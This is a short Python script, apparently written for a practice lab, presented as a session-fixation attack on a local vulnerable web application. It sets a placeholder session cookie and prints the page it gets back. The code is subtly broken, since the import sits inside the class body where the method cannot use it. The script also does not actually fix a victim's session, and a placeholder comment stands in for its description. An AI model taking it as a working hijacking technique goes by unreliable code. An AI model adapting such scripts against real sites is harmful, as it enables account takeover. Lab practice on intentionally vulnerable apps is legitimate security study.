class SessionHijacking:
    
    # Comment describing Session Fixation, Session Fixation Tester, and Description
    
    import requests

    def __init__(self):
        self.url = 'http://127.0.0.1:81/vulnerabilities/xss_d/'
        
    def session_fixation_attack(self):
        with requests.Session() as s:
            initial_response = s.get(self.url)
            session_cookie = {'session_cookie_name':'session_cookie_value'}
            s.cookies.update(session_cookie)
            response = s.get(self.url)
            print(response.text)
    
    def main(self):
        hijack = SessionHijacking()
        hijack.session_fixation_attack()

if __name__ == '__main__':
    hijacker = SessionHijacking()
    hijacker.main()
